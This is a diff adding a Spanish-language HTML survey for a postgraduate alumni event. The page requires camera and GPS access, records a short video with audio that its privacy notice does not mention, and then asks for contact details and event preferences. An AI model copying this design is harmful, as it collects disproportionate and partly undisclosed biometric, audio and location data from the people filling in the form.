@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario Evento Egresados de Posgrado</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 800px;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+
+        .progress-bar {
+            background: #e0e0e0;
+            height: 8px;
+            position: relative;
+        }
+
+        .progress-fill {
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            height: 100%;
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+
+        .content {
+            padding: 40px;
+        }
+
+        .step {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .alert-box {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+
+        .alert-box h3 {
+            color: #856404;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+
+        .alert-box ul {
+            color: #856404;
+            margin-left: 20px;
+            line-height: 1.8;
+        }
+
+        .alert-box .icon {
+            font-size: 48px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .video-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        #videoPreview {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 10px;
+            border: 3px solid #667eea;
+            margin: 20px auto;
+            display: none;
+        }
+
+        .video-status {
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            text-align: center;
+            font-weight: bold;
+            color: #1976d2;
+        }
+
+        .countdown {
+            font-size: 48px;
+            color: #667eea;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+            font-size: 16px;
+        }
+
+        .form-group input[type="text"],
+        .form-group input[type="email"],
+        .form-group input[type="tel"],
+        .form-group select,
+        .form-group textarea {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: border-color 0.3s;
+            font-family: inherit;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus,
+        .form-group textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .form-group textarea {
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        .radio-group,
+        .checkbox-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .radio-option,
+        .checkbox-option {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .radio-option:hover,
+        .checkbox-option:hover {
+            border-color: #667eea;
+            background: #f5f7ff;
+        }
+
+        .radio-option input,
+        .checkbox-option input {
+            margin-right: 10px;
+            cursor: pointer;
+            width: 18px;
+            height: 18px;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            gap: 15px;
+        }
+
+        .btn {
+            padding: 14px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            flex: 1;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-secondary {
+            background: #6c757d;
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            background: #5a6268;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .success-message {
+            text-align: center;
+            padding: 40px;
+        }
+
+        .success-message .icon {
+            font-size: 80px;
+            color: #28a745;
+            margin-bottom: 20px;
+        }
+
+        .success-message h2 {
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .success-message p {
+            color: #666;
+            line-height: 1.6;
+        }
+
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        .location-info {
+            background: #d4edda;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            display: none;
+        }
+
+        .location-info p {
+            color: #155724;
+            margin: 5px 0;
+        }
+
+        .step-indicator {
+            text-align: center;
+            color: #667eea;
+            font-weight: bold;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 22px;
+            }
+
+            .content {
+                padding: 25px;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎓 Formulario Evento de Egresados de Posgrado</h1>
+            <p>Tu opinión es importante para nosotros</p>
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressBar"></div>
+        </div>
+
+        <div class="content">
+            <!-- PASO 1: Aviso de Privacidad y Permisos -->
+            <div class="step active" id="step1">
+                <div class="step-indicator">Paso 1 de 5</div>
+                <div class="alert-box">
+                    <div class="icon">📹 📍</div>
+                    <h3>Aviso Importante: Permisos Requeridos</h3>
+                    <p style="margin-bottom: 15px; color: #856404;">
+                        Para continuar con este formulario, necesitamos tu autorización para:
+                    </p>
+                    <ul>
+                        <li><strong>Cámara:</strong> Se grabará un video de 5 segundos para verificación de identidad</li>
+                        <li><strong>Ubicación GPS:</strong> Se registrará tu ubicación actual para validar tu asistencia</li>
+                    </ul>
+                    <p style="margin-top: 15px; color: #856404; font-weight: bold;">
+                        Estos datos serán utilizados únicamente para fines del evento de egresados y serán tratados de manera confidencial.
+                    </p>
+                </div>
+                <div class="error-message" id="permissionError"></div>
+                <div class="button-group">
+                    <button class="btn btn-primary" onclick="acceptPermissions()">
+                        Aceptar y Continuar
+                    </button>
+                </div>
+            </div>
+
+            <!-- PASO 2: Captura de Video -->
+            <div class="step" id="step2">
+                <div class="step-indicator">Paso 2 de 5</div>
+                <h2 style="text-align: center; color: #333; margin-bottom: 20px;">
+                    Grabación de Video de Verificación
+                </h2>
+                <div class="video-container">
+                    <video id="videoPreview" autoplay playsinline></video>
+                    <div class="countdown" id="countdown"></div>
+                    <div class="video-status" id="videoStatus">
+                        Preparando cámara...
+                    </div>
+                </div>
+                <div class="location-info" id="locationInfo">
+                    <p><strong>📍 Ubicación registrada:</strong></p>
+                    <p id="locationText"></p>
+                </div>
+            </div>
+
+            <!-- PASO 3: Datos Personales -->
+            <div class="step" id="step3">
+                <div class="step-indicator">Paso 3 de 5</div>
+                <h2 style="color: #333; margin-bottom: 25px;">Datos Personales</h2>
+
+                <div class="form-group">
+                    <label for="nombre">1. Nombre completo: *</label>
+                    <input type="text" id="nombre" required placeholder="Escribe tu nombre completo">
+                </div>
+
+                <div class="form-group">
+                    <label for="email">2. Correo electrónico: *</label>
+                    <input type="email" id="email" required placeholder="ejemplo@correo.com">
+                </div>
+
+                <div class="form-group">
+                    <label for="telefono">3. Teléfono: *</label>
+                    <input type="tel" id="telefono" required placeholder="10 dígitos">
+                </div>
+
+                <div class="form-group">
+                    <label for="programa">4. Programa de posgrado del que egresaste: *</label>
+                    <select id="programa" required>
+                        <option value="">Selecciona una opción</option>
+                        <option value="maestria_administracion">Maestría en Administración</option>
+                        <option value="maestria_educacion">Maestría en Educación</option>
+                        <option value="maestria_ingenieria">Maestría en Ingeniería</option>
+                        <option value="doctorado_ciencias">Doctorado en Ciencias</option>
+                        <option value="doctorado_humanidades">Doctorado en Humanidades</option>
+                        <option value="otro">Otro</option>
+                    </select>
+                </div>
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="previousStep()">Anterior</button>
+                    <button class="btn btn-primary" onclick="nextStep()">Siguiente</button>
+                </div>
+            </div>
+
+            <!-- PASO 4: Preferencias del Evento (Preguntas 5-7) -->
+            <div class="step" id="step4">
+                <div class="step-indicator">Paso 4 de 5</div>
+                <h2 style="color: #333; margin-bottom: 25px;">Preferencias del Evento</h2>
+
+                <div class="form-group">
+                    <label>5. ¿Qué tipo de evento te gustaría que fuera? *</label>
+                    <div class="radio-group">
+                        <label class="radio-option">
+                            <input type="radio" name="tipoEvento" value="formal" required>
+                            Formal (cena de gala, vestimenta formal)
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="tipoEvento" value="semiformal" required>
+                            Semi-formal (cocktail, vestimenta elegante casual)
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="tipoEvento" value="casual" required>
+                            Casual (reunión informal, vestimenta libre)
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="tipoEvento" value="tematico" required>
+                            Temático (fiesta con tema específico)
+                        </label>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>6. ¿Qué horario prefieres para el evento? *</label>
+                    <div class="radio-group">
+                        <label class="radio-option">
+                            <input type="radio" name="horario" value="manana" required>
+                            Mañana (9:00 AM - 12:00 PM)
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="horario" value="tarde" required>
+                            Tarde (2:00 PM - 6:00 PM)
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="horario" value="noche" required>
+                            Noche (7:00 PM - 11:00 PM)
+                        </label>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>7. ¿Qué actividades te gustaría que se incluyeran? (Selecciona todas las que apliquen) *</label>
+                    <div class="checkbox-group">
+                        <label class="checkbox-option">
+                            <input type="checkbox" name="actividades" value="discursos">
+                            Discursos y reconocimientos
+                        </label>
+                        <label class="checkbox-option">
+                            <input type="checkbox" name="actividades" value="musica">
+                            Música en vivo / DJ
+                        </label>
+                        <label class="checkbox-option">
+                            <input type="checkbox" name="actividades" value="cena">
+                            Cena / Banquete
+                        </label>
+                        <label class="checkbox-option">
+                            <input type="checkbox" name="actividades" value="networking">
+                            Networking profesional
+                        </label>
+                        <label class="checkbox-option">
+                            <input type="checkbox" name="actividades" value="entretenimiento">
+                            Entretenimiento (juegos, rifas, etc.)
+                        </label>
+                        <label class="checkbox-option">
+                            <input type="checkbox" name="actividades" value="fotografia">
+                            Sesión de fotografía profesional
+                        </label>
+                    </div>
+                </div>
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="previousStep()">Anterior</button>
+                    <button class="btn btn-primary" onclick="nextStep()">Siguiente</button>
+                </div>
+            </div>
+
+            <!-- PASO 5: Preferencias Adicionales y Envío (Preguntas 8-10) -->
+            <div class="step" id="step5">
+                <div class="step-indicator">Paso 5 de 5</div>
+                <h2 style="color: #333; margin-bottom: 25px;">Detalles Finales</h2>
+
+                <div class="form-group">
+                    <label for="lugar">8. ¿Qué tipo de lugar prefieres? *</label>
+                    <select id="lugar" required>
+                        <option value="">Selecciona una opción</option>
+                        <option value="salon_eventos">Salón de eventos</option>
+                        <option value="hotel">Hotel</option>
+                        <option value="jardin">Jardín / Terraza</option>
+                        <option value="restaurante">Restaurante</option>
+                        <option value="campus">Campus universitario</option>
+                        <option value="otro">Otro</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label>9. ¿Asistirías con acompañante? *</label>
+                    <div class="radio-group">
+                        <label class="radio-option">
+                            <input type="radio" name="acompanante" value="si" required>
+                            Sí, asistiría con acompañante
+                        </label>
+                        <label class="radio-option">
+                            <input type="radio" name="acompanante" value="no" required>
+                            No, asistiría solo/a
+                        </label>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="sugerencias">10. Sugerencias o comentarios adicionales:</label>
+                    <textarea id="sugerencias" placeholder="Comparte tus ideas, sugerencias o comentarios sobre el evento..."></textarea>
+                </div>
+
+                <div class="error-message" id="submitError"></div>
+
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="previousStep()">Anterior</button>
+                    <button class="btn btn-primary" onclick="submitForm()">Enviar Formulario</button>
+                </div>
+            </div>
+
+            <!-- Mensaje de Éxito -->
+            <div class="step" id="stepSuccess">
+                <div class="success-message">
+                    <div class="icon">✅</div>
+                    <h2>¡Formulario Enviado Exitosamente!</h2>
+                    <p>Gracias por completar el formulario.</p>
+                    <p>Tus respuestas han sido registradas correctamente.</p>
+                    <p style="margin-top: 20px; color: #667eea; font-weight: bold;">
+                        Te contactaremos pronto con los detalles del evento.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Variables globales
+        let currentStep = 1;
+        let videoBlob = null;
+        let locationData = null;
+        let mediaRecorder = null;
+        let stream = null;
+        const totalSteps = 5;
+
+        // Actualizar barra de progreso
+        function updateProgress() {
+            const progress = (currentStep / totalSteps) * 100;
+            document.getElementById('progressBar').style.width = progress + '%';
+        }
+
+        // Navegación entre pasos
+        function showStep(step) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('step' + step).classList.add('active');
+            currentStep = step;
+            updateProgress();
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function nextStep() {
+            if (validateCurrentStep()) {
+                if (currentStep < totalSteps) {
+                    showStep(currentStep + 1);
+                }
+            }
+        }
+
+        function previousStep() {
+            if (currentStep > 1) {
+                showStep(currentStep - 1);
+            }
+        }
+
+        // Validación de pasos
+        function validateCurrentStep() {
+            if (currentStep === 3) {
+                const nombre = document.getElementById('nombre').value.trim();
+                const email = document.getElementById('email').value.trim();
+                const telefono = document.getElementById('telefono').value.trim();
+                const programa = document.getElementById('programa').value;
+
+                if (!nombre || !email || !telefono || !programa) {
+                    alert('Por favor, completa todos los campos obligatorios.');
+                    return false;
+                }
+
+                // Validar email
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(email)) {
+                    alert('Por favor, ingresa un correo electrónico válido.');
+                    return false;
+                }
+
+                // Validar teléfono (10 dígitos)
+                const telefonoRegex = /^\d{10}$/;
+                if (!telefonoRegex.test(telefono.replace(/\s/g, ''))) {
+                    alert('Por favor, ingresa un teléfono válido de 10 dígitos.');
+                    return false;
+                }
+            }
+
+            if (currentStep === 4) {
+                const tipoEvento = document.querySelector('input[name="tipoEvento"]:checked');
+                const horario = document.querySelector('input[name="horario"]:checked');
+                const actividades = document.querySelectorAll('input[name="actividades"]:checked');
+
+                if (!tipoEvento || !horario) {
+                    alert('Por favor, selecciona una opción en todas las preguntas.');
+                    return false;
+                }
+
+                if (actividades.length === 0) {
+                    alert('Por favor, selecciona al menos una actividad.');
+                    return false;
+                }
+            }
+
+            if (currentStep === 5) {
+                const lugar = document.getElementById('lugar').value;
+                const acompanante = document.querySelector('input[name="acompanante"]:checked');
+
+                if (!lugar || !acompanante) {
+                    alert('Por favor, completa todas las preguntas obligatorias.');
+                    return false;
+                }
+            }
+
+            return true;
+        }
+
+        // PASO 1: Solicitar permisos
+        async function acceptPermissions() {
+            const errorDiv = document.getElementById('permissionError');
+            errorDiv.style.display = 'none';
+
+            try {
+                // Solicitar permisos de cámara
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: true
+                });
+
+                // Solicitar permisos de ubicación
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            timestamp: new Date().toISOString()
+                        };
+
+                        // Continuar al paso 2 para grabar video
+                        showStep(2);
+                        startVideoRecording();
+                    },
+                    (error) => {
+                        errorDiv.textContent = 'Error al obtener la ubicación: ' + error.message + '. Por favor, acepta los permisos de ubicación.';
+                        errorDiv.style.display = 'block';
+                        if (stream) {
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                    }
+                );
+
+            } catch (error) {
+                errorDiv.textContent = 'Error al acceder a la cámara: ' + error.message + '. Por favor, acepta los permisos de cámara.';
+                errorDiv.style.display = 'block';
+            }
+        }
+
+        // PASO 2: Grabar video de 5 segundos
+        function startVideoRecording() {
+            const video = document.getElementById('videoPreview');
+            const statusDiv = document.getElementById('videoStatus');
+            const countdownDiv = document.getElementById('countdown');
+            const locationInfo = document.getElementById('locationInfo');
+            const locationText = document.getElementById('locationText');
+
+            video.style.display = 'block';
+            video.srcObject = stream;
+
+            // Mostrar ubicación
+            if (locationData) {
+                locationText.textContent = `Lat: ${locationData.latitude.toFixed(6)}, Long: ${locationData.longitude.toFixed(6)}`;
+                locationInfo.style.display = 'block';
+            }
+
+            // Countdown de 3 segundos antes de iniciar
+            let countdown = 3;
+            statusDiv.textContent = 'Prepárate para la grabación...';
+            countdownDiv.textContent = countdown;
+
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                if (countdown > 0) {
+                    countdownDiv.textContent = countdown;
+                } else {
+                    clearInterval(countdownInterval);
+                    countdownDiv.textContent = '';
+                    startRecording();
+                }
+            }, 1000);
+        }
+
+        function startRecording() {
+            const statusDiv = document.getElementById('videoStatus');
+            const countdownDiv = document.getElementById('countdown');
+
+            statusDiv.textContent = '🔴 Grabando...';
+
+            const chunks = [];
+            mediaRecorder = new MediaRecorder(stream);
+
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    chunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = () => {
+                videoBlob = new Blob(chunks, { type: 'video/webm' });
+                statusDiv.textContent = '✅ Video grabado exitosamente';
+
+                // Detener stream
+                stream.getTracks().forEach(track => track.stop());
+
+                // Esperar 2 segundos y continuar al siguiente paso
+                setTimeout(() => {
+                    showStep(3);
+                }, 2000);
+            };
+
+            mediaRecorder.start();
+
+            // Grabar por 5 segundos con countdown
+            let recordTime = 5;
+            countdownDiv.textContent = recordTime + 's';
+
+            const recordInterval = setInterval(() => {
+                recordTime--;
+                countdownDiv.textContent = recordTime + 's';
+
+                if (recordTime <= 0) {
+                    clearInterval(recordInterval);
+                    mediaRecorder.stop();
+                }
+            }, 1000);
+        }
+
+        // PASO 5: Enviar formulario
+        function submitForm() {
+            if (!validateCurrentStep()) {
+                return;
+            }
+
+            // Recopilar todos los datos
+            const formData = {
+                // Datos de verificación
+                video: videoBlob,
+                ubicacion: locationData,
+
+                // Datos personales
+                nombre: document.getElementById('nombre').value,
+                email: document.getElementById('email').value,
+                telefono: document.getElementById('telefono').value,
+                programa: document.getElementById('programa').value,
+
+                // Preferencias del evento
+                tipoEvento: document.querySelector('input[name="tipoEvento"]:checked').value,
+                horario: document.querySelector('input[name="horario"]:checked').value,
+                actividades: Array.from(document.querySelectorAll('input[name="actividades"]:checked'))
+                    .map(cb => cb.value),
+
+                // Detalles finales
+                lugar: document.getElementById('lugar').value,
+                acompanante: document.querySelector('input[name="acompanante"]:checked').value,
+                sugerencias: document.getElementById('sugerencias').value,
+
+                // Metadata
+                fechaEnvio: new Date().toISOString()
+            };
+
+            // Aquí normalmente enviarías los datos al servidor
+            console.log('Datos del formulario:', formData);
+
+            // Simular envío (en producción, aquí harías un fetch/ajax al servidor)
+            // Por ejemplo:
+            /*
+            const data = new FormData();
+            data.append('video', videoBlob, 'verification.webm');
+            data.append('datos', JSON.stringify(formData));
+
+            fetch('/api/formulario-egresados', {
+                method: 'POST',
+                body: data
+            })
+            .then(response => response.json())
+            .then(result => {
+                showStep('Success');
+            })
+            .catch(error => {
+                document.getElementById('submitError').textContent = 'Error al enviar el formulario. Por favor, intenta nuevamente.';
+                document.getElementById('submitError').style.display = 'block';
+            });
+            */
+
+            // Por ahora, solo mostramos el mensaje de éxito
+            showStep('Success');
+        }
+
+        // Inicializar
+        updateProgress();
+    </script>
+</body>
+</html>
